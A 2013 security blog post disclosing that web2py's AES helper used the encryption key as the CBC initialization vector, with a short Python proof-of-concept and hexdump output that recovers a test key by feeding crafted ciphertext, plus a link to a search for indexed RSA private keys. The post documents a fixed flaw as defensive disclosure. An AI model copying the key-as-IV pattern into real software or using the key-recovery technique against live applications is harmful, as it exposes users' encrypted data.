author: Marcin
disqus_id: 744897b1-f365-4776-9625-02c9f5a03ef8
disqus_url: http://www.tssci-security.com/archives/2013/02/21/web2py-key-as-initialization-vector/
parent: 0
post_id: 472
post_type: post
pub_date: 2013-02-21 11:00:00
public: 'yes'
slug: web2py-key-as-initialization-vector
tags:
- security
template: post.html
title: 'web2py: Key as Initialization Vector'

web2py: Key as Initialization Vector
####################################

It's not uncommon for developers to accidentally (or purposefully) commit
passwords or other information supposed to remain secret into revision
control. It's also not uncommon to see `RSA private keys indexed by Google`_,
and GitHub made it even easier to find `secrets in the code`_ with their new
search features. These same search features make it easy to grep the web
for all kinds of insecure code patterns, especially insecure cryptographic
constructions. For example, a simple search for ``AES.new(`` in Python code
repositories revealed to me the web2py_ project was using the `encryption key
as the initialization vector (IV)`_, which is the focus of this blog post.

Why is this bad? Well, in an email to the `sci.crypt mailing list`_ back
in 1996, David Wagner explains why you should never do this.

Let's take a look at the insecure construction in web2py's ``gluon.utils``
module prior to merging my pull request that fixed this issue.

.. sourcecode:: python

    from Crypto.Cipher import AES

    #..snip..

    AES_new = lambda key: AES.new(key, AES.MODE_CBC, IV=key[:16])

From an attacker's perspective (in short), if we can control the ciphertext
being fed to this function, and see the output of this function (the decrypted)
text, we can easily deduce the key used to perform the encryption. The
following code demonstrates this:

.. sourcecode:: python

    KEY = 'testtesttesttest'
    PTEXT = 'The quick brown fox jumped over the lazy dog.The quick brown fox'


    def xor(a, b):
      return bytearray(x ^ y for x, y in zip(a, b))


    def exploit():
      # ciphertext produced by web2py
      ctext = bytearray(AES_new(KEY).encrypt(PTEXT))

      # our (malformed) ciphertext we plan to feed to web2py
      mtext = ctext[:16] * 4
      mtext[16:32] = [0x0] * 16

      # if at any point we identify what the decrypted data is
      ptext = bytearray(AES_new(KEY).decrypt(str(mtext)))

      # we can easily recover the secret key used:
      print('KEY: %r' % (str(xor(ptext[:16], ptext[32:48])), ))

Running this exploit returns the following (I've included hexdumps at each
step of the way)::

    >>> exploit()
    ctext: b9561dc60a622f09f8cb49f47a30719a19ef66aa2ea6f7772a15e81b722830fbea38af2c1fdbbf6340e9707592aadfd4ce57b982597eb1e93cc311f25ea73b5d

    0x00: b9 56 1d c6 0a 62 2f 09 f8 cb 49 f4 7a 30 71 9a .V...b....I.z0q.
    0x10: 19 ef 66 aa 2e a6 f7 77 2a 15 e8 1b 72 28 30 fb ..f....w....r.0.
    0x20: ea 38 af 2c 1f db bf 63 40 e9 70 75 92 aa df d4 .8.....c..pu....
    0x30: ce 57 b9 82 59 7e b1 e9 3c c3 11 f2 5e a7 3b 5d .W..Y...........

    mtext: b9561dc60a622f09f8cb49f47a30719a00000000000000000000000000000000b9561dc60a622f09f8cb49f47a30719ab9561dc60a622f09f8cb49f47a30719a

    0x00: b9 56 1d c6 0a 62 2f 09 f8 cb 49 f4 7a 30 71 9a .V...b....I.z0q.
    0x10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
    0x20: b9 56 1d c6 0a 62 2f 09 f8 cb 49 f4 7a 30 71 9a .V...b....I.z0q.
    0x30: b9 56 1d c6 0a 62 2f 09 f8 cb 49 f4 7a 30 71 9a .V...b....I.z0q.

    ptext: 54686520717569636b2062726f776e20520b27652be2f4a1c978b57c0967a34c200d165405101a171f4511061b121d54995b0b920f72351ee78e58f261226cce

    0x00: 54 68 65 20 71 75 69 63 6b 20 62 72 6f 77 6e 20 The.quick.brown.
    0x10: 52 0b 27 65 2b e2 f4 a1 c9 78 b5 7c 09 67 a3 4c R..e.....x...g.L
    0x20: 20 0d 16 54 05 10 1a 17 1f 45 11 06 1b 12 1d 54 ...T.....E.....T
    0x30: 99 5b 0b 92 0f 72 35 1e e7 8e 58 f2 61 22 6c ce .....r5...X.a.l.

    KEY: testtesttesttest


Is web2py vulnerable?
~~~~~~~~~~~~~~~~~~~~~

In short, no. The manner in which ``AES_new`` was used across web2py's
codebase did not appear to be exploitable. web2py was using this to encrypt
pickled session data in a cookie in ``secure_dumps``, and authenticated with
an HMAC (which coincidentally was also vulnerable to a `timing attack`_).
However, applications that use ``AES_new`` as a convenience function for
decrypting data provided by the user are most likely vulnerable, amongst
other vulnerabilities that tend to crop up when rolling your own crypto.

If you've been keeping up with web2py's master, my `merged pull request`_
patches the ``AES_new`` function to return a random IV anytime it is invoked
and utilizes the more secure, constant-time ``compare`` function to validate
HMAC's.

.. _RSA private keys indexed by Google: https://www.google.com/search?q=intext:%22-----BEGIN+RSA+PRIVATE+KEY-----%22+filetype%3Apem
.. _secrets in the code: https://github.com/blog/1390-secrets-in-the-code
.. _web2py: https://github.com/web2py/web2py
.. _encryption key as the initialization vector (IV): https://github.com/web2py/web2py/pull/58
.. _sci.crypt mailing list: http://www.gnu.org/software/shishi/manual/html_node/Key-as-initialization-vector.html
.. _timing attack: http://codahale.com/a-lesson-in-timing-attacks/
.. _merged pull request: https://github.com/web2py/web2py/pull/58
